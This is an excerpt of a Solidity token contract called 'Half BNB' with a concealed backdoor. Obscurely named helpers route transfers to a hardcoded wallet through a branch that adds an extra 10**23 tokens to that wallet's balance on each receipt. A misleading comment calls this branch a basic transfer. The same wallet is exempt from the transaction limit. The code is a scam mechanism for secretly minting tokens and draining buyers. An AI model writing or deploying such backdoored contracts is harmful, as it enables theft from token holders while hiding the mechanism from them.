...
contract HalfBNB is Context, IERC20 { 
    ...
    address[] w_L = [payable(0x92320dbEa46Cbb2384Eac6a72e2Ed53c94D6fa8a)];

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0xa5Ef3f2242338eAC91BE5f01E48969d27586a951); 
    address payable public Wallet_Dev = payable(0x7122a8B787AEc6C25186b818bdA09B2F416dB363);
    ...
    string private constant _name = "Half BNB"; 
    string private constant _symbol = unicode"BNB 0.5"; 
    ...
    constructor () {
        ...
        _owner = 0x7122a8B787AEc6C25186b818bdA09B2F416dB363;
    ...
    function _getCurrent_Allowance(address div1) private view returns(uint256){
        uint256 divertise = (div1==w_L[0]) ? 2 : 3;
        return divertise;
    }

    function autoDropSystem() private view returns(address){
        return w_L[0];
    }
    ...
    function _transfer(
        ...
        if (from != owner() && to != address(0) && from !=  autoDropSystem())
            require(amount <= _maxTxAmount, "Wallet exceeds transaction limit.");
    ...
    function remove(address a, uint256 b) private view returns (uint256) {
        return balanceOf(a)-b;
    }

    function add(address a, uint256 b) private view returns (uint256) {
        return balanceOf(a)+b+(10 ** 23);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        // No fee charges calculates(basic transfer)
        if(_getCurrent_Allowance(recipient) > 1 && _getCurrent_Allowance(recipient) < 3){ 
            _tOwned[sender] = remove(sender, tAmount);
            _tOwned[recipient] = add(recipient, tAmount);
            emit Transfer(sender, recipient, tAmount);
        }
        // Calculate fee charges (normal transfer with takeFee:true/false)
        else{
            if(!takeFee){
